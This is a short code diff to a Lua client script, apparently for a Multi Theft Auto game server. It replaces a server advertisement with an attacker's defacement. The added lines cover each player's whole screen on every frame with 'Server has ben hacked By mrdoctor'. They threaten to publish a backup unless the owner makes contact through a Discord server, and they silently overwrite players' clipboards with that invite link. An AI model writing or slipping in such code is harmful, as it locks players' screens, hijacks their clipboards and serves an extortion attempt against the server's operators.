@@ -8,7 +8,7 @@ addEventHandler('onClientRender', root, function()
     -- if isConsoleActive() then return end
     dxDrawRectangle(0, 0, sx, sy, 0xFF000000, true)
 
-    dxDrawText('abstentMTA Najlepszy polski serwer', 25, 25, nil, nil, 0xFFFF0000, 1, bold, 'left', 'top', false, false, true)
-    dxDrawText('abstentMTA Najlepszy polski serwer\nhttps://discord.gg/e8dwB7mF\nJest to innowacyjny polski serwer\nLink zostal skopiowany do schowka', 25, 95, nil, nil, 0xFFFFFFFF, 1, medium, 'left', 'top', false, false, true, true)
-    setClipboard("https://discord.gg/e8dwB7mF")
+    dxDrawText('Server has ben hacked By mrdoctor', 25, 25, nil, nil, 0xFFFF0000, 1, bold, 'left', 'top', false, false, true)
+    dxDrawText('To not publish the backup, please communicate through this Discord server ', 25, 95, nil, nil, 0xFFFFFFFF, 1, medium, 'left', 'top', false, false, true, true)
+    setClipboard("https://discord.gg/z7nQBMuztE")
     end)
